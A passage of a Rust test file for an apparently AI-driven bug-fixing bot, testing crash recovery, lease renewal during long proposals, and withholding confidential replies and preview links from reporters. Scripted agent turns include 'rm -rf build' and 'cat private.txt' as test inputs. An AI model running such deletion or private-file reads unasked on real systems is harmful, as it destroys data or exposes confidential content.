    assert_eq!(saw.fixes[0].fix.commit, None);
    assert_eq!(
        saw.fixes[0].fix.verify_url.as_deref(),
        Some("https://pr-1.preview.example")
    );
    assert!(!saw.fixes[0].held);
    assert!(saw.comments.iter().any(|c| c.body == "On it."));
}

/// A workspace that does the effect of its first call of each op, says so,
/// and never answers: a crash between the effect and the journal.
#[derive(Default)]
struct DiesAfterTheEffect {
    inner: FakeWorkspace,
    /// What it offers once it has died: a target that went while the run
    /// was down.
    then_offers: Option<Offer>,
    /// The ops that have died once.
    died: Mutex<Vec<&'static str>>,
    effect: tokio::sync::Notify,
}

impl DiesAfterTheEffect {
    async fn die_once(&self, op: &'static str) {
        if self.died.lock().unwrap().contains(&op) {
            return;
        }
        self.died.lock().unwrap().push(op);
        self.effect.notify_one();
        std::future::pending::<()>().await;
    }
}

#[async_trait::async_trait]
impl Workspace for DiesAfterTheEffect {
    fn offer(&self, run: &Run, queue: Option<&str>) -> Offer {
        match &self.then_offers {
            Some(o) if !self.died.lock().unwrap().is_empty() => o.clone(),
            _ => self.inner.offer(run, queue),
        }
    }
    async fn exec(
        &self,
        run: &Run,
        queue: Option<&str>,
        command: &str,
        cwd: Option<&str>,
        timeout_secs: u64,
    ) -> Result<Value, HostError> {
        let v = self
            .inner
            .exec(run, queue, command, cwd, timeout_secs)
            .await;
        self.die_once("exec").await;
        v
    }
    async fn propose(&self, run: &Run, p: &Proposal) -> Result<Value, HostError> {
        let v = self.inner.propose(run, p).await;
        self.die_once("propose").await;
        v
    }
    async fn finish(&self, run: &Run) {
        self.inner.finish(run).await;
    }
}

/// Drives `run` until `w`'s effect is done, then drops the tick as a crash
/// does and lets the lease lapse, then drives it on another driver.
async fn crash_at_the_effect(env: &Env, w: &Arc<DiesAfterTheEffect>, run: &str) {
    let deps = with(env, w.clone());
    let first = DriverId::mint();
    tokio::select! {
        out = env.drive(&deps, run, &first) => panic!("it ended: {out:?}"),
        () = w.effect.notified() => {}
    }
    env.clock.advance(120);
    let out = env.drive(&deps, run, &DriverId::mint()).await;
    assert_eq!(out.last().unwrap().next, Next::Done(RunStatus::Finished));
}

#[tokio::test]
async fn a_command_cut_off_before_its_answer_is_not_run_again_and_says_so() {
    let env = Env::new().await;
    let w = Arc::new(DiesAfterTheEffect::default());
    env.api.push(env.script_turn(
        "tu_1",
        "Shell",
        r#"try { return await clax.shell.exec("rm -rf build"); }
           catch (e) { return [e.code, e.message]; }"#,
    ));
    env.api.push(finish_turn("done"));
    let run = env.run();
    crash_at_the_effect(&env, &w, &run).await;
    assert_eq!(w.inner.calls.lock().unwrap().commands, ["rm -rf build"]);
    let v = script_value(&env, &run)["value"].clone();
    assert_eq!(v[0], json!(CODE_SHELL_INTERRUPTED), "{v}");
    assert!(v[1].as_str().unwrap().contains("state"), "{v}");
}

#[tokio::test]
async fn a_proposal_cut_off_before_its_answer_pushes_once_and_is_proposed_once() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let w = Arc::new(DiesAfterTheEffect::default());
    env.api.push(script_turn(
        "tu_1",
        "Fix",
        r#"return await clax.change.propose({title: "t", summary: "Fixed."});"#,
    ));
    env.api.push(finish_turn("done"));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    crash_at_the_effect(&env, &w, &run).await;
    assert_eq!(w.inner.calls.lock().unwrap().proposals.len(), 1);
    assert_eq!(script_value(&env, &run)["value"]["pr"], json!(1));
    let saw = as_reporter(&env, &qid, &report.id);
    assert_eq!(saw.fixes.len(), 1, "{:?}", saw.fixes);
}

#[tokio::test]
async fn a_proposal_begun_before_its_offer_went_finishes_and_keeps_its_fix() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let w = Arc::new(DiesAfterTheEffect {
        then_offers: Some(Offer::default()),
        ..DiesAfterTheEffect::default()
    });
    env.api.push(script_turn(
        "tu_1",
        "Fix",
        r#"return await clax.change.propose({title: "t", summary: "Fixed."});"#,
    ));
    env.api.push(finish_turn("done"));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    crash_at_the_effect(&env, &w, &run).await;
    assert_eq!(script_value(&env, &run)["value"]["pr"], json!(1));
    assert_eq!(as_reporter(&env, &qid, &report.id).fixes.len(), 1);
}

#[tokio::test]
async fn a_proposal_the_report_can_no_longer_take_leaves_its_members_a_note() {
    let env = Env::new().await;
    let (_, report) = filed(&env, None);
    let w = Arc::new(DiesAfterTheEffect::default());
    env.api.push(script_turn(
        "tu_1",
        "Fix",
        r#"try { return await clax.change.propose({title: "t", summary: "Fixed."}); }
           catch (e) { return e.code; }"#,
    ));
    env.api.push(finish_turn("done"));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    let deps = with(&env, w.clone());
    let first = DriverId::mint();
    tokio::select! {
        out = env.drive(&deps, &run, &first) => panic!("it ended: {out:?}"),
        () = w.effect.notified() => {}
    }
    let taken = HostError::new("thread_taken", "someone holds this report");
    env.host
        .lock()
        .fail_next
        .insert("check_fix".to_string(), taken);
    env.clock.advance(120);
    env.drive(&deps, &run, &DriverId::mint()).await;
    assert_eq!(script_value(&env, &run)["value"], json!("thread_taken"));
    assert_eq!(env.host.lock().member_notes, [PROPOSAL_STRANDED]);
}

#[tokio::test]
async fn a_step_executed_again_reads_its_answered_commands_from_the_journal() {
    let env = Env::new().await;
    let w = Arc::new(FakeWorkspace::default());
    env.api.push(env.script_turn(
        "tu_1",
        "Shell",
        r#"const a = await clax.shell.exec("one");
           const b = await clax.shell.exec("two");
           return [a.output, b.output];"#,
    ));
    env.api.push(finish_turn("done"));
    let run = env.run();
    let mut crashed = with(&env, w.clone());
    crate::resume::crash_once(
        &mut crashed,
        clax_bot::run::CrashPoint::BeforeCommit {
            step: 2,
            kind: StepKind::Script,
        },
    );
    env.drive(&crashed, &run, &DriverId::mint()).await;
    env.clock.advance(120);
    env.drive(&with(&env, w.clone()), &run, &DriverId::mint())
        .await;
    assert_eq!(w.calls.lock().unwrap().commands, ["one", "two"]);
    assert_eq!(script_value(&env, &run)["value"], json!(["ran 1", "ran 2"]));
}

/// A workspace whose `propose` waits for the store's clock to pass `secs`,
/// a little at a time, as a preview's wait does: each stretch it waits for
/// the run's claim to be renewed, and asks whether a rival could take it.
struct SlowPreview {
    inner: FakeWorkspace,
    store: Arc<clax_store::Store>,
    clock: Arc<clax_core::working::ManualClock>,
    lease_secs: i64,
    secs: i64,
    rival_took_it: Mutex<bool>,
}

#[async_trait::async_trait]
impl Workspace for SlowPreview {
    fn offer(&self, run: &Run, queue: Option<&str>) -> Offer {
        self.inner.offer(run, queue)
    }
    async fn exec(
        &self,
        run: &Run,
        queue: Option<&str>,
        command: &str,
        cwd: Option<&str>,
        timeout_secs: u64,
    ) -> Result<Value, HostError> {
        self.inner
            .exec(run, queue, command, cwd, timeout_secs)
            .await
    }
    async fn propose(&self, run: &Run, p: &Proposal) -> Result<Value, HostError> {
        let rival = DriverId::mint();
        let stretch = self.lease_secs / 2;
        for _ in 0..self.secs / stretch {
            let claimed = |s: &Self| s.store.run(&run.id).unwrap().unwrap().claimed_at;
            let before = claimed(self);
            self.clock.advance(stretch);
            tokio::time::timeout(Duration::from_secs(60), async {
                while claimed(self) == before {
                    tokio::task::yield_now().await;
                }
            })
            .await
            .expect("the run's claim is renewed during the call");
            if self
                .store
                .claim_run(&run.id, &rival, self.lease_secs)
                .unwrap()
                .is_some()
            {
                *self.rival_took_it.lock().unwrap() = true;
            }
        }
        self.inner.propose(run, p).await
    }
    async fn finish(&self, run: &Run) {
        self.inner.finish(run).await;
    }
}

fn slow_preview(env: &Env, secs: i64) -> Arc<SlowPreview> {
    let mut s = env.settings.0.lock().unwrap();
    s.renew_every = Duration::from_millis(1);
    Arc::new(SlowPreview {
        inner: FakeWorkspace::default(),
        store: env.store.clone(),
        clock: env.clock.clone(),
        lease_secs: s.lease_secs,
        secs,
        rival_took_it: Mutex::new(false),
    })
}

#[tokio::test]
async fn a_propose_of_many_minutes_keeps_the_runs_claim_and_takes_one_step() {
    let env = Env::new().await;
    let (_, report) = filed(&env, None);
    let w = slow_preview(&env, 20 * 60);
    env.api.push(script_turn(
        "tu_1",
        "Fix",
        r#"return await clax.change.propose({title: "t", summary: "Fixed."});"#,
    ));
    env.api.push(finish_turn("done"));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    let out = env
        .drive(&with(&env, w.clone()), &run, &DriverId::mint())
        .await;
    assert_eq!(out.last().unwrap().next, Next::Done(RunStatus::Finished));
    assert!(!*w.rival_took_it.lock().unwrap());
    assert_eq!(script_value(&env, &run)["value"]["pr"], json!(1));
    let (_, steps) = env.store.run_with_steps(&run).unwrap().unwrap();
    let scripts = steps.iter().filter(|s| s.kind == StepKind::Script).count();
    assert_eq!(scripts, 1);
}

#[tokio::test]
async fn a_propose_that_outlasts_the_runs_time_keeps_its_fix_and_the_run_stops_at_the_cap() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let minutes = i64::from(env.settings.0.lock().unwrap().max_run_minutes);
    let w = slow_preview(&env, (minutes + 1) * 60);
    env.api.push(script_turn(
        "tu_1",
        "Fix",
        r#"return await clax.change.propose({title: "t", summary: "Fixed."});"#,
    ));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    let out = env
        .drive(&with(&env, w.clone()), &run, &DriverId::mint())
        .await;
    assert_eq!(out.last().unwrap().next, Next::Done(RunStatus::Stopped));
    assert_eq!(env.run_row(&run).reason.as_deref(), Some("run_cap"));
    assert_eq!(as_reporter(&env, &qid, &report.id).fixes.len(), 1);
    assert_eq!(w.inner.calls.lock().unwrap().finished, [run]);
}

/// Keeps the sink a workspace is handed.
#[derive(Default)]
struct Previews {
    inner: FakeWorkspace,
    sink: Mutex<Option<Arc<dyn PreviewSink>>>,
    /// A preview already up, told of before `propose` answers.
    up_at_once: Option<String>,
}

#[async_trait::async_trait]
impl Workspace for Previews {
    fn offer(&self, run: &Run, queue: Option<&str>) -> Offer {
        self.inner.offer(run, queue)
    }
    async fn exec(
        &self,
        run: &Run,
        queue: Option<&str>,
        command: &str,
        cwd: Option<&str>,
        timeout_secs: u64,
    ) -> Result<Value, HostError> {
        self.inner
            .exec(run, queue, command, cwd, timeout_secs)
            .await
    }
    async fn propose(&self, run: &Run, p: &Proposal) -> Result<Value, HostError> {
        if let Some(url) = &self.up_at_once {
            let sink = self.sink.lock().unwrap().clone().unwrap();
            sink.preview_ready(&run.id, url, false).await?;
        }
        self.inner.propose(run, p).await
    }
    fn previews(&self, sink: Arc<dyn PreviewSink>) {
        *self.sink.lock().unwrap() = Some(sink);
    }
    async fn finish(&self, run: &Run) {
        self.inner.finish(run).await;
    }
}

#[tokio::test]
async fn a_late_preview_of_a_confidential_run_reaches_the_reporter_only_if_a_person_reviews_them() {
    for (offer, for_reporter) in [
        (Offer::CHANGE.confidential(), false),
        (Offer::CHANGE.confidential().reviewed_previews(), true),
    ] {
        let env = Env::new().await;
        let (_, report) = filed(&env, None);
        let w = Arc::new(Previews {
            inner: FakeWorkspace::offering(offer.clone()),
            ..Previews::default()
        });
        let deps = with(&env, w.clone());
        let run = env.run_for(OWNER, &report.artifact.id, &report.id);
        assert!(deps.confidential(&env.run_row(&run)).unwrap());
        let sink = w.sink.lock().unwrap().clone().unwrap();
        sink.preview_ready(
            &run,
            "https://pr-1.preview.example",
            offer.reviewed_previews,
        )
        .await
        .unwrap();
        assert_eq!(env.host.lock().previews[0].1, for_reporter);
    }
}

#[tokio::test]
async fn a_late_preview_goes_by_what_the_run_was_offered_and_not_by_its_target_now() {
    for (offered, now, for_reporter) in [
        (
            false,
            Offer::CHANGE.confidential().reviewed_previews(),
            false,
        ),
        (true, Offer::CHANGE.confidential(), true),
    ] {
        let env = Env::new().await;
        let (_, report) = filed(&env, None);
        let w = Arc::new(Previews {
            inner: FakeWorkspace::offering(now),
            ..Previews::default()
        });
        let deps = with(&env, w.clone());
        let run = env.run_for(OWNER, &report.artifact.id, &report.id);
        assert!(deps.confidential(&env.run_row(&run)).unwrap());
        let sink = w.sink.lock().unwrap().clone().unwrap();
        sink.preview_ready(&run, "https://pr-1.preview.example", offered)
            .await
            .unwrap();
        assert_eq!(env.host.lock().previews[0].1, for_reporter);
    }
}

#[tokio::test]
async fn a_stop_during_a_fixs_recording_loses_nothing_told_of_its_preview() {
    let env = Arc::new(Env::new().await);
    let (_, report) = filed(&env, None);
    let url = "https://pr-1.preview.example";
    let w = Arc::new(Previews {
        up_at_once: Some(url.to_string()),
        ..Previews::default()
    });
    env.host.lock().record_fix_hangs = true;
    env.api.push(script_turn(
        "tu_1",
        "Fix",
        r#"return await clax.change.propose({title: "t", summary: "s"});"#,
    ));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    let cancel = clax_bot_sandbox::CancelToken::new();
    let task = {
        let (env, run, cancel, w) = (env.clone(), run.clone(), cancel.clone(), w.clone());
        tokio::spawn(async move {
            let (deps, driver) = (with(&env, w), DriverId::mint());
            loop {
                let opts = clax_bot::TickOpts {
                    budget: None,
                    cancel: cancel.clone(),
                    events: &*env.hub,
                };
                let out = clax_bot::tick(&deps, &run, &driver, opts).await;
                if out.unwrap().next != Next::Runnable {
                    return;
                }
            }
        })
    };
    let reached = async {
        while !env.host.lock().record_fix_reached {
            tokio::task::yield_now().await;
        }
    };
    tokio::time::timeout(PROMPTLY, reached).await.unwrap();
    assert!(env.host.lock().previews.is_empty(), "held for the fix");

    env.store
        .cancel_run(&clax_bot::run::bot_ctx(OWNER), &run)
        .unwrap();
    cancel.cancel();
    tokio::time::timeout(PROMPTLY, task).await.unwrap().unwrap();
    let told = async {
        while env.host.lock().previews.is_empty() {
            tokio::task::yield_now().await;
        }
    };
    tokio::time::timeout(PROMPTLY, told).await.unwrap();
    assert_eq!(env.host.lock().previews, [(url.to_string(), true)]);
}

#[tokio::test]
async fn a_wait_that_ended_with_no_preview_reaches_the_host() {
    let env = Env::new().await;
    let w = Arc::new(Previews::default());
    let _deps = with(&env, w.clone());
    let run = env.run();
    let sink = w.sink.lock().unwrap().clone().unwrap();
    sink.preview_missed(&run).await.unwrap();
    assert_eq!(env.host.lock().previews_missed, [run]);
    let e = sink.preview_missed("no-such-run").await;
    assert_eq!(e.unwrap_err().code, "not_found");
}

#[tokio::test]
async fn a_fix_with_nothing_to_check_is_held_on_a_public_target_too() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let w = Arc::new(FakeWorkspace {
        no_preview: true,
        ..FakeWorkspace::default()
    });
    env.api.push(script_turn(
        "tu_1",
        "Fix",
        r#"return await clax.change.propose({title: "t", summary: "Fixed the total."});"#,
    ));
    env.api.push(finish_turn("done"));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    env.drive(&with(&env, w), &run, &DriverId::mint()).await;
    let saw = as_reporter(&env, &qid, &report.id);
    assert!(saw.fixes[0].held);
    assert_eq!(saw.fixes[0].fix.summary, FIX_PROPOSED);
    assert_eq!(saw.fixes[0].fix.url, None);
    assert!(!format!("{saw:?}").contains("Fixed the total"), "{saw:?}");
    let members = env.store.report(&qid, &report.id, Visibility::All);
    let members = members.unwrap().unwrap();
    assert!(
        members
            .comments
            .iter()
            .any(|c| c.triage_only && c.body.contains("Fixed the total")),
        "{members:?}"
    );
    assert!(!env.run_row(&run).confidential, "the target is public");
}

/// A note for the queue's members on report `tid`.
fn note(env: &Env, tid: &str, author_kind: &'static str) {
    note_saying(env, tid, author_kind, SECRET);
}

fn note_saying(env: &Env, tid: &str, author_kind: &'static str, body: &str) {
    let c = clax_store::threads::NewComment {
        author_kind,
        author_name: "Sam".into(),
        author_public_id: None,
        via_session_id: None,
        body: body.into(),
        via_page: false,
    };
    env.store
        .add_members_comment(&AuditCtx::DAEMON, tid, c)
        .unwrap();
}

#[tokio::test]
async fn a_run_after_a_confidential_one_on_its_thread_stays_confidential_with_its_link_gone() {
    let env = Env::new().await;
    let (_, report) = filed(&env, None);
    let w = Offers::of(Offer::CHANGE.confidential());
    let deps = with(&env, w.clone());
    let first = env.run_for(OWNER, &report.artifact.id, &report.id);
    assert!(deps.confidential(&env.run_row(&first)).unwrap());
    *w.offer.lock().unwrap() = Offer::default();
    let later = env.run_for(OWNER, &report.artifact.id, &report.id);
    assert!(deps.confidential(&env.run_row(&later)).unwrap());
    assert!(env.run_row(&later).confidential, "and kept");
}

#[tokio::test]
async fn a_persons_members_note_makes_a_run_confidential_on_a_queue_with_no_target() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    note(&env, &report.id, clax_core::model::AUTHOR_VIEWER);
    let code = format!(
        r#"await clax.threads.reply({:?}, {SECRET:?}); return 1;"#,
        report.id
    );
    env.api.push(script_turn("tu_1", "Reply", &code));
    env.api.push(finish_turn("done"));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    env.drive(&env.deps(), &run, &DriverId::mint()).await;
    assert!(env.run_row(&run).confidential);
    let saw = as_reporter(&env, &qid, &report.id);
    assert!(!format!("{saw:?}").contains(SECRET), "{saw:?}");
}

#[tokio::test]
async fn a_note_a_public_run_left_says_nothing_of_the_next_run() {
    let env = Env::new().await;
    let (_, report) = filed(&env, None);
    note(&env, &report.id, clax_core::model::AUTHOR_AGENT);
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    let deps = with(&env, Offers::of(Offer::CHANGE));
    assert!(!deps.confidential(&env.run_row(&run)).unwrap());
}

#[tokio::test]
async fn a_claim_released_in_no_words_of_its_own_says_nothing_of_the_next_run() {
    let env = Env::new().await;
    let (_, report) = filed(&env, None);
    let released = clax_store::queues::RELEASED_BODY;
    note_saying(&env, &report.id, clax_core::model::AUTHOR_VIEWER, released);
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    let deps = with(&env, Offers::of(Offer::CHANGE));
    assert!(!deps.confidential(&env.run_row(&run)).unwrap());
}

#[tokio::test]
async fn a_target_that_could_not_be_read_is_confidential_for_the_tick_and_kept_on_nothing() {
    let env = Env::new().await;
    let (_, report) = filed(&env, None);
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    let w = Offers::of(Offer::unsure());
    let deps = with(&env, w.clone());
    let row = env.run_row(&run);
    assert!(deps.confidential(&row).unwrap());
    assert!(!env.run_row(&run).confidential);
    assert!(!deps.workspace_offer(&row).shell);
    *w.offer.lock().unwrap() = Offer::CHANGE;
    assert!(!deps.confidential(&row).unwrap());
}

/// A workspace whose target turns confidential at its first command, in the
/// middle of a turn, and that sees whether the run was marked before its next.
struct TurnsConfidential {
    inner: FakeWorkspace,
    store: Arc<clax_store::Store>,
    offer: Mutex<Offer>,
    /// Whether the run was marked when each later command began.
    marked: Mutex<Vec<bool>>,
}

#[async_trait::async_trait]
impl Workspace for TurnsConfidential {
    fn offer(&self, _run: &Run, _queue: Option<&str>) -> Offer {
        self.offer.lock().unwrap().clone()
    }
    async fn exec(
        &self,
        run: &Run,
        queue: Option<&str>,
        command: &str,
        cwd: Option<&str>,
        timeout_secs: u64,
    ) -> Result<Value, HostError> {
        let first = *self.offer.lock().unwrap() == Offer::CHANGE;
        if first {
            *self.offer.lock().unwrap() = Offer::CHANGE.confidential();
        } else {
            let now = self.store.run(&run.id).unwrap().unwrap();
            self.marked.lock().unwrap().push(now.confidential);
        }
        self.inner
            .exec(run, queue, command, cwd, timeout_secs)
            .await
    }
    async fn propose(&self, run: &Run, p: &Proposal) -> Result<Value, HostError> {
        self.inner.propose(run, p).await
    }
    async fn finish(&self, run: &Run) {
        self.inner.finish(run).await;
    }
}

#[tokio::test]
async fn a_target_that_turns_confidential_in_a_turn_marks_the_run_before_its_command() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let w = Arc::new(TurnsConfidential {
        inner: FakeWorkspace::default(),
        store: env.store.clone(),
        offer: Mutex::new(Offer::CHANGE),
        marked: Mutex::default(),
    });
    let code = format!(
        r#"await clax.shell.exec("ls");
           await clax.shell.exec("cat private.txt");
           await clax.threads.reply({:?}, {SECRET:?});
           return 1;"#,
        report.id
    );
    env.api.push(script_turn("tu_1", "Read", &code));
    env.api.push(finish_turn("done"));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    env.drive(&with(&env, w.clone()), &run, &DriverId::mint())
        .await;
    assert_eq!(*w.marked.lock().unwrap(), [true]);
    let saw = as_reporter(&env, &qid, &report.id);
    assert!(!format!("{saw:?}").contains(SECRET), "{saw:?}");
}

#[tokio::test]
async fn a_target_that_turns_confidential_during_a_command_holds_what_that_command_read() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let w = Arc::new(TurnsConfidential {
        inner: FakeWorkspace::default(),
        store: env.store.clone(),
        offer: Mutex::new(Offer::CHANGE),
        marked: Mutex::default(),
    });
    let code = format!(
        r#"await clax.shell.exec("cat private.txt");
           await clax.threads.reply({:?}, {SECRET:?});
           return 1;"#,
        report.id
    );
    env.api.push(script_turn("tu_1", "Read", &code));
    env.api.push(finish_turn("done"));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    env.drive(&with(&env, w.clone()), &run, &DriverId::mint())
        .await;
    assert!(env.run_row(&run).confidential);
    let saw = as_reporter(&env, &qid, &report.id);
    assert!(!format!("{saw:?}").contains(SECRET), "{saw:?}");
}

#[tokio::test]
async fn a_preview_that_comes_up_after_its_run_reaches_the_host() {
    let env = Env::new().await;
    let w = Arc::new(Previews::default());
    let _deps = with(&env, w.clone());
    let run = env.run();
    let sink = w
        .sink
        .lock()
        .unwrap()
        .clone()
        .expect("the deps gave a sink");
    sink.preview_ready(&run, "https://pr-1.preview.example", false)
        .await
        .unwrap();
    // Not confidential: the link is the reporter's.
    assert_eq!(
        env.host.lock().previews,
        [("https://pr-1.preview.example".to_string(), true)]
    );
    let e = sink.preview_ready("no-such-run", "https://x", false).await;
    assert_eq!(e.unwrap_err().code, "not_found");
}

/// What a run writes of its fix once it has proposed: for the queue's people.
const SAID_AFTER: &str = "Fix proposed in https://forge.example/pr/1: it failed before.";
const SAID_OF_THE_FIX: &str = "The total rounded twice, as the report's words asked.";

/// How many notes for the queue's members on report `tid` say `body`.
fn notes_saying(env: &Env, qid: &str, tid: &str, body: &str) -> usize {
    let all = env.store.report(qid, tid, Visibility::All);
    let all = all.unwrap().unwrap().comments;
    all.iter()
        .filter(|c| c.triage_only && c.body == body)
        .count()
}

/// That `body` went to the queue's people on report `tid`, once, and all a
/// reporter can read there holds none of it.
fn kept_from_the_reporter(env: &Env, qid: &str, tid: &str, body: &str) {
    assert_eq!(notes_saying(env, qid, tid, body), 1, "{body}");
    let saw = serde_json::to_string(&as_reporter(env, qid, tid)).unwrap();
    assert!(!saw.contains(body), "{saw}");
    let thread = env.store.get_thread(tid).unwrap().unwrap();
    assert!(thread.comments.iter().all(|c| !c.body.contains(body)));
}

fn reaches_the_reporter(env: &Env, qid: &str, tid: &str, body: &str) {
    let saw = as_reporter(env, qid, tid);
    assert!(saw.comments.iter().any(|c| c.body == body), "{saw:?}");
}

fn reply_code(tid: &str, body: &str) -> String {
    format!("return await clax.threads.reply({tid:?}, {body:?});")
}

fn no_preview() -> Arc<FakeWorkspace> {
    Arc::new(FakeWorkspace {
        no_preview: true,
        ..FakeWorkspace::default()
    })
}

/// A run proposing on `report` through `w`, ended.
async fn proposed(env: &Env, report: &Report, w: &Arc<FakeWorkspace>) -> String {
    env.api.push(script_turn(
        "tu_fix",
        "Fix",
        r#"return await clax.change.propose({title: "t", summary: "Fixed."});"#,
    ));
    env.api.push(finish_turn("done"));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    env.drive(&with(env, w.clone()), &run, &DriverId::mint())
        .await;
    run
}

async fn a_reply_each_side_of_a_proposal(w: Arc<FakeWorkspace>) {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let code = format!(
        r#"await clax.threads.reply({id:?}, "I will fix this.");
           await clax.change.propose({{title: "t", summary: {SAID_OF_THE_FIX:?}}});
           return await clax.threads.reply({id:?}, {SAID_AFTER:?});"#,
        id = report.id
    );
    env.api.push(script_turn("tu_1", "Fix", &code));
    env.api.push(finish_turn("Done, see the pull request."));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    env.drive(&with(&env, w), &run, &DriverId::mint()).await;

    reaches_the_reporter(&env, &qid, &report.id, "I will fix this.");
    kept_from_the_reporter(&env, &qid, &report.id, SAID_AFTER);
    // What the model wrote of the fix, and its pull request, stay with the
    // queue's people, whether or not the fix has a preview yet.
    let saw = as_reporter(&env, &qid, &report.id);
    assert_eq!(saw.fixes[0].fix.summary, FIX_PROPOSED);
    assert_eq!(saw.fixes[0].fix.url, None);
    let seen = serde_json::to_string(&saw).unwrap();
    assert!(!seen.contains(SAID_OF_THE_FIX), "{seen}");
    assert!(!seen.contains("forge.example"), "{seen}");
    let all = env.store.report(&qid, &report.id, Visibility::All);
    let all = all.unwrap().unwrap().comments;
    assert!(
        all.iter()
            .any(|c| c.triage_only && c.body.contains(SAID_OF_THE_FIX)),
        "{all:?}"
    );
    let told = script_value(&env, &run);
    assert_eq!(told["value"]["members_only"], true, "{told}");
    assert_eq!(told["reply_note"], REPLY_KEPT, "{told}");
    assert!(!env.run_row(&run).confidential, "the target is public");
}

#[tokio::test]
async fn a_reply_after_a_proposal_goes_to_the_queues_people_while_its_fix_is_held() {
    a_reply_each_side_of_a_proposal(no_preview()).await;
}

#[tokio::test]
async fn a_reply_after_a_proposal_goes_to_the_queues_people_with_its_preview_up() {
    a_reply_each_side_of_a_proposal(Arc::new(FakeWorkspace::default())).await;
}

#[tokio::test]
async fn a_reply_a_later_step_makes_after_a_proposal_goes_to_the_queues_people() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    env.api.push(script_turn(
        "tu_1",
        "Fix",
        r#"return await clax.change.propose({title: "t", summary: "Fixed."});"#,
    ));
    let reply = reply_code(&report.id, SAID_AFTER);
    env.api.push(script_turn("tu_2", "Tell", &reply));
    env.api.push(finish_turn("done"));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    env.drive(&with(&env, no_preview()), &run, &DriverId::mint())
        .await;
    kept_from_the_reporter(&env, &qid, &report.id, SAID_AFTER);
}

#[tokio::test]
async fn a_finish_summary_after_a_proposal_goes_to_the_queues_people() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    env.api.push(script_turn(
        "tu_1",
        "Fix",
        r#"return await clax.change.propose({title: "t", summary: "Fixed."});"#,
    ));
    env.api.push(finish_turn(SAID_AFTER));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    env.drive(&with(&env, no_preview()), &run, &DriverId::mint())
        .await;
    kept_from_the_reporter(&env, &qid, &report.id, SAID_AFTER);
}

#[tokio::test]
async fn giving_up_after_a_proposal_tells_the_reporter_nothing() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    env.api.push(script_turn(
        "tu_1",
        "Fix",
        r#"return await clax.change.propose({title: "t", summary: "Fixed."});"#,
    ));
    env.api.push(give_up_turn(SAID_AFTER));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    env.drive(&with(&env, no_preview()), &run, &DriverId::mint())
        .await;
    let saw = serde_json::to_string(&as_reporter(&env, &qid, &report.id)).unwrap();
    assert!(!saw.contains(SAID_AFTER), "{saw}");
    let all = env.store.report(&qid, &report.id, Visibility::All);
    let all = all.unwrap().unwrap().comments;
    assert!(
        all.iter()
            .any(|c| c.triage_only && c.body.contains(SAID_AFTER)),
        "{all:?}"
    );
}

#[tokio::test]
async fn a_step_executed_again_keeps_what_follows_its_proposal_from_the_reporter() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let w = Arc::new(DiesAfterTheEffect::default());
    w.died.lock().unwrap().push("propose");
    let code = format!(
        r#"await clax.change.propose({{title: "t", summary: "Fixed."}});
           await clax.threads.reply({id:?}, "Before the crash.");
           try {{ await clax.shell.exec("ls"); }} catch (e) {{}}
           return await clax.threads.reply({id:?}, "After the crash.");"#,
        id = report.id
    );
    env.api.push(script_turn("tu_1", "Fix", &code));
    env.api.push(finish_turn("done"));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    crash_at_the_effect(&env, &w, &run).await;
    kept_from_the_reporter(&env, &qid, &report.id, "Before the crash.");
    kept_from_the_reporter(&env, &qid, &report.id, "After the crash.");
    let told = script_value(&env, &run);
    assert_eq!(told["reply_note"], REPLY_KEPT, "{told}");
}

#[tokio::test]
async fn a_reply_after_a_proposal_cut_off_before_its_answer_goes_to_the_queues_people() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let w = Arc::new(DiesAfterTheEffect::default());
    let code = format!(
        r#"await clax.change.propose({{title: "t", summary: "Fixed."}});
           return await clax.threads.reply({:?}, {SAID_AFTER:?});"#,
        report.id
    );
    env.api.push(script_turn("tu_1", "Fix", &code));
    env.api.push(finish_turn("done"));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    crash_at_the_effect(&env, &w, &run).await;
    kept_from_the_reporter(&env, &qid, &report.id, SAID_AFTER);
}

/// A workspace whose every proposal fails with the error it holds.
struct ProposalFails(FakeWorkspace, HostError);

#[async_trait::async_trait]
impl Workspace for ProposalFails {
    fn offer(&self, run: &Run, queue: Option<&str>) -> Offer {
        self.0.offer(run, queue)
    }
    async fn exec(
        &self,
        run: &Run,
        queue: Option<&str>,
        command: &str,
        cwd: Option<&str>,
        timeout_secs: u64,
    ) -> Result<Value, HostError> {
        self.0.exec(run, queue, command, cwd, timeout_secs).await
    }
    async fn propose(&self, _run: &Run, _p: &Proposal) -> Result<Value, HostError> {
        Err(self.1.clone())
    }
    async fn finish(&self, run: &Run) {
        self.0.finish(run).await;
    }
}

const SAID_ON_FAILING: &str = "I could not change it.";

/// A run on report `report` whose proposal failed with `e`, and that said
